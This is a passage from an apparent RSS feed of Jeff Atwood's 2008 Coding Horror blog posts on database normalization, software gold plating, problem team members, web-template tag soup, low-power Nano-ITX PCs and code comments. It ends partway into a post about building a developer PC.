Trick question! The answer is that <i>it doesn't matter!</i> Until you have millions and millions of rows of data, that is. <a href="http://www.codinghorror.com/blog/archives/000957.html">Everything is fast for small n</a>. Even a modest PC by today's standards -- let's say a dual-core box with 4 gigabytes of memory -- will give you near-identical performance in either case for anything but the very largest of databases. Assuming your team can write reasonably well-tuned queries, of course.
</p>
<p>
There's no shortage of fascinating database war stories from companies that made it big. I do worry that these war stories carry an implied tone of "I lost 200 pounds and so could you!"; please assume the tiny-asterisk disclaimer <b>results may not be typical</b> is in full effect while reading them. Here's a series that Tim O'Reilly compiled:
</p>
<p>
</p>
<ul>
<li>
<a href="http://radar.oreilly.com/2006/04/web-20-and-databases-part-1-se.html">Second Life</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/04/database-war-stories-2-bloglin.html">Blogline and Memeorandum</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/04/database-war-stories-3-flickr.html">Flickr</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/04/database-war-stories-4-nasa-wo.html">NASA World Wind</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/04/database-war-stories-5-craigsl.html">Craigslist</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/05/database-war-stories-6-oreilly.html">O'Reilly Research</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/05/database-war-stories-7-google.html">Google File System and BigTable</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/05/database-war-stories-8-findory.html">Findory and Amazon</a>
</li>
<li>
<a href="http://radar.oreilly.com/2006/05/database-war-stories-9-finis-b.html">MySQL</a>
</li>
</ul>
<p>
There's also the <a href="http://highscalability.com/">High Scalability</a> blog, which has its own set of database war stories:
</p>
<p>
</p>
<ul>
<li>
<a href="http://highscalability.com/youtube-architecture">YouTube</a>
</li>
<li>
<a href="http://highscalability.com/plentyoffish-architecture">PlentyOfFish</a>
</li>
<li>
<a href="http://highscalability.com/google-architecture">Google</a>
</li>
<li>
<a href="http://highscalability.com/myspace-architecture">MySpace</a>
</li>
<li>
<a href="http://highscalability.com/amazon-architecture">Amazon</a>
</li>
<li>
<a href="http://highscalability.com/scaling-twitter-making-twitter-10000-percent-faster">Twitter</a>
</li>
</ul>
<p>
First, a reality check. It's partially an act of hubris to imagine your app as the next Flickr, YouTube, or Twitter. As <a href="http://teddziuba.com/2008/04/im-going-to-scale-my-foot-up-y.html">Ted Dziuba so aptly said</a>, <i>scalability is not your problem, getting people to give a shit is.</i> So when it comes to database design, do measure performance, but try to err heavily on the side of <b>sane, simple design</b>. Pick whatever database schema you feel is easiest to understand and work with on a daily basis. It doesn't have to be all or nothing as I've pictured above; you can partially denormalize where it makes sense to do so, and stay fully normalized in other areas where it doesn't.
</p>
<p>
Despite copious evidence that normalization rarely scales, I find that many <b>software engineers will zealously hold on to total database normalization on principle alone</b>, long after it has <a href="http://www.paradox1x.org/weblog/kmartino/archives/009703.shtml">ceased to make sense</a>.
</p>
<p>
</p>
<blockquote>
When growing Cofax at Knight Ridder, we hit a nasty bump in the road after adding our 17th newspaper to the system. Performance wasn't what it used to be and there were times when services were unresponsive.
<p>
A project was started to resolve the issue, to look for 'the smoking gun'. The thought being that the database, being as well designed as it was, could not be of issue, even with our classic symptom being rapidly growing numbers of db connections right before a crash. So we concentrated on optimizing the application stack.
</p>
<p>
I disagreed and waged a number of arguments that it was our database that needed attention. We first needed to tune queries and indexes, and be willing to, if required, pre-calculate data upon writes and avoid joins by developing a set of denormalized tables. <b>It was a hard pill for me to swallow since I was the original database designer. Turned out it was harder for everyone else!</b> Consultants were called in. They declared the db design to be just right - that the problem must have been the application.
</p>
<p>
After two months of the team pushing numerous releases thought to resolve the issue, to no avail, we came back to my original arguments.
</p>
</blockquote>
<p>
Pat Helland notes that <a href="http://blogs.msdn.com/pathelland/archive/2007/07/23/normalization-is-for-sissies.aspx">people normalize because their professors told them to</a>. I'm a bit more pragmatic; I think you should normalize when the <i>data</i> tells you to:
</p>
<p>
</p>
<ol>
<li>Normalization makes sense to your team.
</li>
<li>Normalization provides better performance. (You're automatically measuring all the queries that flow through your software, right?)
</li>
<li>Normalization prevents an onerous amount of duplication or avoids risk of synchronization problems that your problem domain or users are particularly sensitive to.
</li>
<li>Normalization allows you to write simpler queries and code.
</li>
</ol>
<p>
Never, never should you normalize a database out of some vague sense of duty to <a href="http://en.wikipedia.org/wiki/Boyce-Codd_Normal_Form">the ghosts of Boyce-Codd</a>. Normalization is not magical fairy dust you sprinkle over your database to cure all ills; it often creates as many problems as it solves. Fear not the specter of denormalization. Duplicated data and synchronization problems are often overstated and relatively easy to work around with cron jobs. Disks and memory are cheap and getting cheaper every nanosecond. Measure performance on your system and decide for yourself what works, free of predispositions and bias.
</p>
<p>
As the old adage goes, <b>normalize until it hurts, denormalize until it works</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-14T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/maybe-normalizing-isnt-normal/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Ultimate Software Gold Plating ]]></title>
<link>https://blog.codinghorror.com/the-ultimate-software-gold-plating/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Some developers love to <a href="http://www.codinghorror.com/blog/archives/000150.html">gold plate their software</a>. There are various shades of .. er, gold, I guess, but it's usually considered wasteful to fritter away time gold plating old code in the face of new features that need to be implemented, or old bugs that could be squashed.
</p>
<p>
</p>
<blockquote>
Developers are fascinated by new technology and are sometimes anxious to try out new features of their language or environment or to create their own implementation of a slick feature they saw in another product -- whether or not it's required in their product. The effort required to design, implement, test, document, and support features that are not required lengthens the schedule.
</blockquote>
<p>
But gold plating your code isn't <i>all</i> bad. Perhaps the most remarkable tale of successful developer gold plating I've ever read is <a href="http://www.bytecellar.com/archives/000158.php">the one Blake Patterson outlines</a>:
</p>
<p>
</p>
<blockquote>
Not long ago I purchased a new-in-box <a href="http://en.wikipedia.org/wiki/Atari_Jaguar">Atari Jaguar</a>, complete with <a href="http://en.wikipedia.org/wiki/Jeff_Minter">Jeff Minter's</a> psychedelic sequel to Tempest, <a href="http://en.wikipedia.org/wiki/Tempest_2000">Tempest 2000</a>. It's an amazing game that's been ported to many other platforms, but the consensus is that none are as solid as the Jaguar original. Having played several of the ports, I'd have to agree.
<p>
<img alt="image placeholder" >
</p>
<p>
An interesting thing about "the world's first 64-bit console" -- its controller was, as the Brits would say, fairly pants. It was large, sported a calculator-button array for game overlays (like the <a href="http://en.wikipedia.org/wiki/Intellivision">Intellivision</a> controller), had no shoulder buttons, and featured only a D-pad for directional control. (ed: certainly one of the weirdest members of the <a href="http://www.axess.com/twilight/console/">game console controller family tree</a>, to be sure)
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
As the arcade original is controlled with a rotary spinner knob, the D-pad falls rather short of providing ideal game control.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
But, of course, being such a savvy chap, Jeff Minter realized this.
</p>
<p>
<b>Jeff wrote in support for an analog rotary controller ... <i>that did not exist</i>.</b> Neither Atari nor third party manufacturers produced such a controller in the Jaguar's heyday. Jeff, as I understand it, hacked his own together by wiring an <a href="http://www.atariage.com/2600/controllers/con_AtariPaddles.jpg">Atari paddle controller</a> into a Jaguar controller. In the years since the Jaguar's passing, a few small operations have offered <a href="https://www.goatstore.com/info.php?id=151420">modified Jaguar controllers</a> with spinners wired into them for purchase.
</p>
</blockquote>
<p>
Jeff Minter's an interesting historical figure in the computer gaming community, as the author of several 8-bit computer era game classics. I've talked about his <a href="http://www.codinghorror.com/blog/archives/000511.html">long-standing interest in audio visualization</a> here once before. He's still creating games today; his latest is the Xbox Live downloadable title <a href="http://en.wikipedia.org/wiki/Space_Giraffe">Space Giraffe</a>. Jeff <a href="http://stinkygoat.livejournal.com/">has a blog</a> that he updates fairly regularly.
</p>
<p>
Still, I'm amazed that Jeff added code to a commercially shipped console game to support <b>a completely optional homebrew spinner controller of his own creation</b>. That's the very definition of "not required". This code lied dormant in the game until a handful of enthusiasts, fourteen years later, cobbled together custom controllers to play the game as it was originally intended by the author.
</p>
<p>
If that isn't the ultimate case of gold plating your software, I don't know what is. My hat is off to you, Mr. Minter.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-15T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-ultimate-software-gold-plating/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Dealing With Bad Apples ]]></title>
<link>https://blog.codinghorror.com/dealing-with-bad-apples/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Robert Miesen sent in this story of a project pathology:
</p>
<p>
</p>
<blockquote>
I was part of a team writing an web-based job application and screening system (a job kiosk the customer called it) and my team and our customer signed on to implementing this job kiosk using Windows, Apache, PHP5, and the ZendFramework -- everyone except one of our team members, who I will refer to as "Joe". Joe kept advocating the use of JavaScript throughout the technology deliberation phase, even though the customer made it quite clear that he expected the vast majority of the job kiosk to be implemented using a server-side technology and all the validation should be done using server-side technology.
<p>
The fact that the customer signed off on this, however, did nothing to deter Joe from advocating JavaScript -- abrasively. Every time our project hit a bump in the road, Joe would go off on some tirade on how much easier our lives would be if we were only writing this job kiosk in JavaScript. Joe would constantly bicker about how we were all doing this all wrong because we weren't doing it in JavaScript, not even bother to learn the technologies we were actually using, and, whenever fellow teammates would try and gently bring him back into the fold (usually via email), Joe would just flame the poor guy. At the height of Joe's pro-JavaScript bigotry, he would regularly belt off comments like, "Well, if we had only done it in JavaScript," to such an extent that the team would have been better off if he had just quit (or was reassigned or fired.)
</p>
</blockquote>
<p>
After reading this story, I had to resist the urge to lean forward, hand placed thoughtfully under my chin, brow furrowed, and ask -- <a href="http://thedailywtf.com/Articles/Straight_Shooter_for_Upper_Management.aspx">have you tried JavaScript?</a>
</p>
<p>
Robert thought this story was a cautionary tale about technology dependence, but I see something else: <b>a problem team member, a classic bad apple</b>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm sure "Joe" had the best of intentions, but at the point where you're actively campaigning against the project, and working against your teammates -- <b>you're a liability to the project</b>.
</p>
<p>
The cost of problem personnel on a project is severe, as noted in Chapter 12 of McConnell's <a href="http://www.amazon.com/dp/1556159005/?tag=codihorr-20">Rapid Development: Taming Wild Software Schedules</a>.
</p>
<p>
</p>
<blockquote>
If you tolerate even one developer whom the other developers think is a problem, you'll hurt the morale of the good developers. You are implying that not only do you expect your team members to give their all; you expect them to do it when their co-workers are working against them.
<p>
In a review of 32 management teams, Larson and LaFasto found that <b>the most consistent and intense complaint from team members was that their team leaders were unwilling to confront and resolve problems associated with poor performance by individual team members.</b> (Larson and LaFasto 1989). They report that, "more than any other single aspect of team leadership, members are disturbed by leaders who are unwilling to deal directly and effectively with self-serving or noncontributing team members." They go on to to say that this is a significant management blind spot because managers nearly always think their teams are running more smoothly than their team members do.
</p>
</blockquote>
<p>
How do we identify problem personnel? It's not difficult as you might think. I had a friend of mine once describe someone on his team as -- and this is a direct quote -- "a cancer". At the point which you, or anyone else on your team, are using words like <i>cancer</i> to describe a teammate, you have a serious project pathology. You don't have to be friends with everyone on your team, <a href="http://www.codinghorror.com/blog/archives/001033.html">although it certainly helps</a>, but a level of basic personal and professional respect is mandatory for any team to function normally.
</p>
<p>
Steve outlines a few warning signs that you're dealing with a bad apple on your team:
</p>
<p>
</p>
<ol>
<li>They cover up their ignorance rather than trying to learn from their teammates. "I don't know how to explain my design; I just know that it works." or "My code is too complicated to test." (These are both actual quotes.)
<p></p>
</li>
<li>They have an excessive desire for privacy. "I don't need anyone to review my code."
<p></p>
</li>
<li>They are territorial. "No one else can fix the bugs in my code. I'm too busy to fix them right now, but I'll get to them next week."
<p></p>
</li>
<li>They grumble about team decisions and continue to revisit old discussions long after the team has moved on. "I still think we ought to go back and change the design we were talking about last month. The one we picked isn't going to work."
<p></p>
</li>
<li>Other team members all make wisecracks or complain about the same person regularly. Software developers often won't complain directly, so you have to ask if there's a problem when you hear many wisecracks.
<p></p>
</li>
<li>They don't pitch in on team activities. On one project I worked on, two days before our first major deadline, a developer asked for the day off. The reason? He wanted to spend the day at a men's clothing sale in a nearby city -- a clear sign he hadn't integrated with the team.
</li>
</ol>
<p>
Let me be quite clear on this point: if your team leader or manager isn't dealing with the bad apples on your project, <b>she isn't doing her job</b>.
</p>
<p>
You should never be afraid to remove -- or even fire -- people who do not have the best interests of the team at heart. You can develop skill, but you can't develop a positive attitude. The longer these disruptive personalities stick around on a project, the worse their effects get. They'll slowly spread poison throughout your project, in the form of code, relationships, and contacts.
</p>
<p>
Removing someone from a team is painful; it's not fun for anyone. But <b>realizing you should have removed someone six months ago</b> is far more painful.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-17T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/dealing-with-bad-apples/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Web Development as Tag Soup ]]></title>
<link>https://blog.codinghorror.com/web-development-as-tag-soup/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As we work with <a href="http://www.asp.net/mvc/">ASP.NET MVC</a> on Stack Overflow, I find myself violently thrust back into the bad old days of tag soup that I remember from my tenure as a classic ASP developer in the late 90's. If you're not careful bordering on manically fastidious in constructing your Views, you'll end up with <b>a giant mish-mash of HTML, Javascript, and server-side code</b>. Classic tag soup; difficult to read, difficult to maintain.
</p>
<p>
I don't mean tag soup in the sense of <a href="http://en.wikipedia.org/wiki/Tag_soup">badly formed HTML</a>, or the <a href="http://www.codinghorror.com/blog/archives/000723.html">malformed world</a> we live in. I mean tag soup in the sense of <b>mixing HTML markup and server-side code</b>. Now you can double your pleasure: badly formed HTML, meet badly written code.
</p>
<p>
The tag soup problem seems to be <b>endemic to all modern web development stacks</b>. I see that Ruby on Rails apps have the same problem; here's a slice of representative <a href="http://wiki.rubyonrails.org/rails/pages/UnderstandingViews">RHTML</a> from <a href="http://typosphere.org/projects/show/typo">Typo</a>, a Ruby blogging engine.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Do you find this readable? Can you see where the code begins and the markup ends? Are you confident you could change the code structure without breaking the HTML, or change the HTML structure without breaking the code?
</p>
<p>
Sometimes editing this stuff makes me feel like I'm playing <a href="http://en.wikipedia.org/wiki/Operation_(game)">Operation</a>. I have to ever so carefully maneuver my metal tweezers into one tiny slice of code or HTML and make my changes without touching the edges and setting off that blasted electrical buzzer.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm not trying to single out Rails or Typo here; I could easily show you a ASP.NET MVC view that's just as confusing (or as "clear", if you think that's perfectly readable, I guess). Tag soup is everywhere; take a look at the Python <a href="http://www.djangoproject.com/documentation/templates/">Django framework templates</a>:
</p>
<p>
</p>
<pre>
&lt;h1&gt;Archive for {{ year }}&lt;/h1&gt;
{% for date in days %}
{% ifchanged %}&lt;h3&gt;{{ date|date:"F" }}&lt;/h3&gt;{% endifchanged %}
&lt;a href="{{ date|date:"M/d"|lower }}/"&gt;{{ date|date:"j" }}&lt;/a&gt;
{% endfor %}
</pre>
<p>
Perhaps when it comes to mixing HTML and server-side code, some form of soup is unavoidable, a necessary evil. The soup can be quite palatable; maybe even delicious. It's certainly possible to write <i>good</i> tag soup and <i>bad</i> tag soup.
</p>
<p>
But I have to wonder: <b>is there a better way?</b> Is there something beyond RHTML, Views, and Templates? What examples would you point to of web development stacks that <i>avoided</i> degenerating into yet more hazardous, difficult to maintain tag soup? Is there anything truly better on the horizon?
</p>
<p>
Or is this year's newer, fancier, even-more-delicious iteration of tag soup as good as it ever gets for web development?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-20T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/web-development-as-tag-soup/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Building Tiny, Ultra Low Power PCs ]]></title>
<link>https://blog.codinghorror.com/building-tiny-ultra-low-power-pcs/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In previous posts, I've talked about <a href="http://www.codinghorror.com/blog/archives/000905.html">building your own desktop PC</a>, and <a href="http://www.codinghorror.com/blog/archives/001107.html">building your own home theater PC</a>. I'm still very much in love with that little HTPC I built. Not only does it have a modern dual-core CPU, and fantastic high-definition capable integrated video -- it's an outstanding general purpose media sharing server, too. But the real punchline is that I eventually got that box down to <b>an insanely low 44 watts at idle</b>. That's <a href="http://www.codinghorror.com/blog/archives/001099.html">in the ballpark</a> for a powerful laptop, and far better than your garden variety desktop PC, which will draw <a href="http://www.codinghorror.com/blog/archives/000353.html">somewhere between 100 to 200 watts of power</a>.
</p>
<p>
44 watts is impressive, but what if you want to build a PC that uses even less power -- radically less?
</p>
<p>
That's when you turn to something like AMD's Geode platform <a href="http://www.codinghorror.com/blog/archives/000482.html">in the Nano-ITX form factor</a>. It uses <b><font color="red">five watts</font> of power at idle</b>. That's almost <i>ten times less</i> than my HTPC build I was so proud of!
</p>
<p>
<a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813153096%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboard%2B%2F%2BCPU%2B%2F%2BVGA%2BSets-_-JETWAY-_-13153096&amp;cjsku=N82E16813153096"><img alt="image placeholder" >
</p>
<p>
This is the <a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813153096%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboard%2B%2F%2BCPU%2B%2F%2BVGA%2BSets-_-JETWAY-_-13153096&amp;cjsku=N82E16813153096">JetWay J8F9 AMD Geode LX800 motherboard</a>. I can't say "this is actual size" with a straight face without knowing the size and aspect ratio of your monitor, but it's probably darn close. The actual dimensions are just under five inches on each side. It may not look like much, but consider the specs:
</p>
<p>
</p>
<ul>
<li>500 Mhz <a href="http://en.wikipedia.org/wiki/Geode_(processor)">AMD x86 Geode</a> LX 800 CPU
</li>
<li>200 pin SO-DIMM memory slot, 1 GB DDR-400 max
</li>
<li>Two ATA-100 drive connections
</li>
<li>mini-PCI expansion slot
</li>
<li>CompactFlash memory card slot
</li>
<li>onboard audio / VGA / fast ethernet / USB
</li>
</ul>
<p>
This thing is, for all intents and purposes, <b>a complete, standalone x86 PC that fits in the palm of your hand and sips five watts of power</b>. Well, assuming you have an enormous hand.
</p>
<p>
You will need memory and a storage device, of course. You could pick up a laptop hard drive, but another clever thing about this board is that it allows you to use a cheap CompactFlash card as your storage medium -- for the optimal low power, no moving parts install.
</p>
<p>
</p>
<ol>
<li>
<a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813153096%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboard%2B%2F%2BCPU%2B%2F%2BVGA%2BSets-_-JETWAY-_-13153096&amp;cjsku=N82E16813153096">AMD Geode LX 800 Nano ITX Motherboard/CPU Combo</a> $154
</li>
<li>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820231045%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Notebook%2BMemory%29-_-G.SKILL-_-20231045&amp;cjsku=N82E16820231045">512MB 200-pin SO-DIMM DDR-400</a> $20
</li>
<li>
<a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820211191%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Flash%2BMemory%29-_-A-DATA-_-20211191&amp;cjsku=N82E16820211191">4GB compact flash card</a> $14
</li>
<li>
<a href="http://www.trcelectronics.com/Phihong/psa-15r-120p.shtml">12vdc AC/DC external wall wart</a> $18
</li>
</ol>
<p>
So we can put together our own tiny utility PC for right at 200 bucks. Not bad. Unbox it, snap in the memory and CF card, plug in the wall wart, and you're ready to install and boot your operating system of choice. It's that simple.
</p>
<p>
Naturally, <b>you won't get barn-burning performance</b>, but if you remember the Pentium II 300 Mhz systems of yesteryear, you'll know what to expect. You may recall those now-ancient boxes were still able to do some pretty amazing things in their day. I would not build an ultra-lower power PC assuming it will be tolerable for day-to-day web browsing and email reading, unless you're comfortable using text mode or command-line interfaces exclusively.
</p>
<p>
This must be a market segment JetWay specializes in; they have <a href="http://www.newegg.com/Product/ProductList.aspx?Submit=ENE&amp;N=50001521&amp;Description=mini-itx&amp;name=JETWAY">a surprisingly large number of Mini-ITX motherboards</a> to choose from. I don't think you'll find anything more power-efficient than the Geode LX 800 model, though, but there are some lesser expensive choices that get close. Lots of variety!
</p>
<p>
If the 5" x 5" profile of the Nano-ITX is far too large for your tastes, <a href="http://www.mini-itx.com/reviews/pico-itx/default.asp?page=4">how do you feel about Pico-ITX?</a> It's even smaller at 10cm x 7.2cm.
</p>
<p>
<a href="http://www.mini-itx.com/reviews/pico-itx/default.asp?page=1"><img alt="image placeholder" >
</p>
<p>
I've been following the ultra low power, tiny form factor PC segment for quite a few years now. With the emergence of <a href="http://en.wikipedia.org/wiki/Silverthorne_(CPU)">Intel's Atom</a> and <a href="http://en.wikipedia.org/wiki/Netbook">"netbooks"</a> like the ASUS Eee, it's a segment that is dangerously close to becoming mainstream. If you're interested, <a href="http://www.mini-itx.com/">mini-itx.com</a> is still one of the best sources of hands-on reviews, information, and community projects. It's fun stuff.
</p>
<p>
What could <i>you</i> do with a tiny, highly efficient x86 PC that boots up in under a minute?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-22T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/building-tiny-ultra-low-power-pcs/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Coding Without Comments ]]></title>
<link>https://blog.codinghorror.com/coding-without-comments/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>If peppering your code with lots of comments is good, then having <b>zillions of comments</b> in your code must be <i>great</i>, right? Not quite. Excess is one way <a href="https://blog.codinghorror.com/when-good-comments-go-bad/">good comments go bad</a>:</p>
<pre>
'*************************************************
' Name: CopyString
'
' Purpose: This routine copies a string from the source
' string (source) to the target string (target).
'
' Algorithm: It gets the length of "source" and then copies each
' character, one at a time, into "target". It uses
' the loop index as an array index into both "source"
' and "target" and increments the loop/array index
' after each character is copied.
'
' Inputs: input The string to be copied
'
' Outputs: output The string to receive the copy of "input"
'
' Interface Assumptions: None
'
' Modification History: None
'
' Author: Dwight K. Coder
' Date Created: 10/1/04
' Phone: (555) 222-2255
' SSN: 111-22-3333
' Eye Color: Green
' Maiden Name: None
' Blood Type: AB-
' Mother's Maiden Name: None
' Favorite Car: <a href="https://blog.codinghorror.com/the-pontiac-aztek-and-the-perils-of-design-by-committee/">Pontiac Aztek</a>
' Personalized License Plate: "Tek-ie"
'*************************************************
</pre>
<p>I'm constantly running across comments from developers who don't seem to understand that the code already tells us <i>how</i> it works; <a href="https://blog.codinghorror.com/code-tells-you-how-comments-tell-you-why/">we need the comments to tell us <i>why</i> it works.</a> Code comments are so widely misunderstood and abused that you might find yourself wondering if they're worth using at all. Be careful what you wish for. Here's some code with <b>no comments whatsoever</b>:</p>
<pre>
r = n / 2;
while ( abs( r - (n/r) ) &gt; t ) {
  r = 0.5 * ( r + (n/r) );
}
System.out.println( "r = " + r );
</pre>
<p>Any idea what that bit of code does? It's perfectly readable, but <i>what the heck does it do?</i></p>
<p>Let's add a comment.</p>
<pre>
// square root of n with Newton-Raphson approximation
r = n / 2;
while ( abs( r - (n/r) ) &gt; t ) {
  r = 0.5 * ( r + (n/r) );
}
System.out.println( "r = " + r );
</pre>
<p>That must be what I was getting at, right? Some sort of pleasant, middle-of-the-road compromise between the two polar extremes of no comments whatsoever and carefully formatted epic poems every second line of code?</p>
<p>Not exactly. Rather than add a comment, I'd refactor to this:</p>
<pre>
private double SquareRootApproximation(n) {
  r = n / 2;
  while ( abs( r - (n/r) ) &gt; t ) {
    r = 0.5 * ( r + (n/r) );
  }
return r;
}
System.out.println( "r = " + SquareRootApproximation(r) );
</pre>
<p>I haven't added a single comment, and yet this mysterious bit of code is now perfectly understandable.</p>
<p>While comments are neither inherently good or bad, they are frequently used as a crutch. <b>You should always write your code as if comments didn't exist.</b> This <i>forces</i> you to write your code in the simplest, plainest, most self-documenting way you can humanly come up with.</p>
<p>When you've rewritten, refactored, and rearchitected your code a dozen times to make it easy for your fellow developers to read and understand – when you can't possibly imagine any conceivable way your code could be changed to become more straightforward and obvious – then, and <i>only then</i>, should you feel compelled to add a comment explaining what your code does.</p>
<p>As <a href="http://steve-yegge.blogspot.com/2008/02/portrait-of-n00b.html">Steve points out</a>, this is one key difference between junior and senior developers:</p>
<blockquote>
<p>In the old days, seeing too much code at once quite frankly exceeded my complexity threshold, and when I had to work with it I'd typically try to rewrite it or at least comment it heavily. Today, however, I just slog through it without complaining (much). When I have a specific goal in mind and a complicated piece of code to write, I spend my time making it happen rather than telling myself stories about it [in comments].</p>
</blockquote>
<p>Junior developers rely on comments to tell the story when they should be relying on the <em>code</em> to tell the story. Comments are narrative asides; important in their own way, but in no way meant to replace plot, characterization, and setting.</p>
<p>Perhaps that's the dirty little secret of code comments: <b>to write good comments you have to be a good writer</b>. Comments aren't code meant for the compiler, they're words meant to communicate ideas to other human beings. While I do (mostly) love my fellow programmers, I can't say that effective communication with other human beings is exactly our strong suit. I've seen three-paragraph emails from developers on my teams that practically melted my brain. <em>These</em> are the people we're trusting to write clear, understandable comments in our code? I think maybe some of us might be better off sticking to our strengths – that is, writing for the compiler, in as clear a way as we possibly can, and reaching for the comments only as a method of last resort.</p>
<p>Writing good, meaningful comments is hard. It's as much an art as writing the code itself; maybe even more so. As Sammy Larbi said in <a href="http://www.codeodor.com/index.cfm/2008/6/18/Common-Excuses-Used-To-Comment-Code-and-What-To-Do-About-Them/2293">Common Excuses Used To Comment Code</a>, if your feel your code is too complex to understand <i>without</i> comments, <b>your code is probably just bad.</b> Rewrite it until it doesn't need comments any more. If, at the end of that effort, you still feel comments are necessary, then by all means, add comments … carefully.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-24T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/coding-without-comments/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Understanding The Hardware ]]></title>
<link>https://blog.codinghorror.com/understanding-the-hardware/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I got a call from <a href="http://blog.wekeroad.com">Rob Conery</a> today asking for advice on building his own computer. Rob works for Microsoft, but lives in Hawaii. I'm not sure how he managed that, but being so far from the mothership apparently means he has the flexibility to spec his own PC. Being stuck in Hawaii is, I'm sure, <a href="http://flickr.com/search/?q=hawaii">a total bummer, dude</a>.
</p>
<p>
Rob and I may disagree on <a href="http://blog.wekeroad.com/2007/10/30/in-which-we-discuss-proprietary-object-noise/">pretty much everything</a> from a coding perspective, but we can agree on one thing: <a href="http://www.codinghorror.com/blog/archives/000761.html">we love computers</a>. And what better way to celebrate that love by building your own? It's not hard. This industry was <a href="http://www.codinghorror.com/blog/archives/000573.html">built on</a> the <a href="http://www.codinghorror.com/blog/archives/000814.html">commodification of hardware</a>. If you can snap together a Lego kit, <a href="http://www.codinghorror.com/blog/archives/000905.html">you can build a computer</a>.
</p>
<p>
Maybe this is a minority opinion, but I find understanding the hardware to be instructive for programmers. Peter Norvig -- now director of research at Google -- <a href="http://www.norvig.com/21-days.html">appears to concur</a>.
</p>
<p>
</p>
<blockquote>
<b>Understand how the hardware affects what you do.</b> Know how long it takes your computer to execute an instruction, fetch a word from memory (with and without a cache miss), transfer data over ethernet (or the internet), read consecutive words from disk, and seek to a new location on disk.
</blockquote>
<p>
In my book, one of the best ways to understand the hardware is to get your hands dirty and put one together, including installing the OS, yourself. It's a shame Apple programmers can't do this, as <a href="http://www.codinghorror.com/blog/archives/001044.html">their hardware has to be blessed by the Cupertino DRM gods</a>. Or, you could <a href="http://www.macworld.com/article/133028/2008/04/building_mac_clone.html">build a frankenmac</a>, though you'll run the risk of running a "patched" OS X indefinitely.
</p>
<p>
As Rob and I were talking about the philosophy of building your own development PC -- something I also <a href="http://www.hanselman.com/blog/HanselminutesPodcast69BuildingADeveloperPC.aspx">discussed on a Hanselminutes podcast</a> -- he said <i>you know, you should blog this</i>. But Rob -- I already have, many times over! Let's walk down the core list of components I recommended for Rob, and I'll explain my choices with links to the relevant blog posts I've made on that particular topic.
</p>
<p>
<b><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813131219%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BIntel-_-ASUS-_-13131219&amp;cjsku=N82E16813131219">ASUS P5E Intel X38 motherboard</a></b> ($225)
</p>
<p>
